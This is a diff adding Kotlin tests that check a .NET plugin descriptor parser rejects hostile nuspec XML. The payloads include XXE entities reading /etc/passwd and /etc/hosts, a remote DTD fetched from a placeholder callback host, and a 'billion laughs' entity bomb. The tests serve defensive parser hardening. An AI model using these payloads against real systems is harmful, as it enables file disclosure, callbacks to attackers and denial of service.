@@ -235,6 +235,153 @@ class DotNetPluginTest(fileSystemType: FileSystemType) : BasePluginManagerTest<R
     }
   }
 
+  @Test
+  fun `failed to parse xml with xxe in value`() {
+    val xxe = """
+      <!DOCTYPE description [
+        <!ENTITY file SYSTEM "file:///etc/passwd">
+      ]>
+
+      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
+        <metadata>
+          <id>xxe in dotnet description test</id>
+          <version>0.1</version>
+          <description>&file;</description>
+          <authors>Ivan Chirkov</authors>
+          <title>xxe-in-dotnet-description-test</title>
+          <summarytest</summary>
+          <licenseUrl>http://license.url</licenseUrl>
+          <requireLicenseAcceptance>false</requireLicenseAcceptance>
+          <releaseNotes></releaseNotes>
+        </metadata>
+      </package>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with xxe in attribute`() {
+    val xxe = """
+      <!DOCTYPE doc [
+        <!ENTITY ff SYSTEM "file:///etc/hosts">
+      ]>
+
+      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
+        <metadata>
+          <id>xxe in dotnet description test</id>
+          <version>0.1</version>
+          <description info="&ff;">test</description>
+          <authors>Ivan Chirkov</authors>
+          <title>xxe-in-dotnet-description-test</title>
+          <summary>test</summary>
+          <licenseUrl>http://license.url</licenseUrl>
+          <requireLicenseAcceptance>false</requireLicenseAcceptance>
+          <releaseNotes></releaseNotes>
+        </metadata>
+      </package>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with remote dtd xxe`() {
+    val xxe = """
+      <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://YOUR_CALLBACK/evil.dtd">
+        %remote;
+      ]>
+
+      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
+        <metadata>
+          <id>xxe in dotnet description test</id>
+          <version>0.1</version>
+          <description>test</description>
+          <authors>Ivan Chirkov</authors>
+          <title>xxe-in-dotnet-description-test</title>
+          <summary>test</summary>
+          <licenseUrl>http://license.url</licenseUrl>
+          <requireLicenseAcceptance>false</requireLicenseAcceptance>
+          <releaseNotes></releaseNotes>
+        </metadata>
+      </package>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with error local dtd`() {
+    val xxe = """
+      <!DOCTYPE root [
+        <!ENTITY % local "abc">
+        <!ENTITY name "%local;">
+        <!ENTITY ex "start &name; end">
+      ]>
+
+      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
+        <metadata>
+          <id>xxe in dotnet description test</id>
+          <version>0.1</version>
+          <description>&ex;</description>
+          <authors>Ivan Chirkov</authors>
+          <title>xxe-in-dotnet-description-test</title>
+          <summary>test</summary>
+          <licenseUrl>http://license.url</licenseUrl>
+          <requireLicenseAcceptance>false</requireLicenseAcceptance>
+          <releaseNotes></releaseNotes>
+        </metadata>
+      </package>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with xml bomb`() {
+    val xxe = """
+      <!DOCTYPE lolz [
+       <!ENTITY a "aaaaaaaaaa">
+       <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+       <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+       <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+       <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+      ]>
+
+      <package xmlns="http://schemas.microsoft.com/packaging/2011/08/nuspec.xsd">
+        <metadata>
+          <id>xxe in dotnet description test</id>
+          <version>0.1</version>
+          <description>&e;</description>
+          <authors>Ivan Chirkov</authors>
+          <title>xxe-in-dotnet-description-test</title>
+          <summary>test</summary>
+          <licenseUrl>http://license.url</licenseUrl>
+          <requireLicenseAcceptance>false</requireLicenseAcceptance>
+          <releaseNotes></releaseNotes>
+        </metadata>
+      </package>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
+
   private fun `test invalid plugin xml`(pluginXmlContent: String, expectedProblems: List<PluginProblem>) {
     val pluginFolder = getTempPluginArchive(pluginXmlContent)
     assertProblematicPlugin(pluginFolder, expectedProblems)
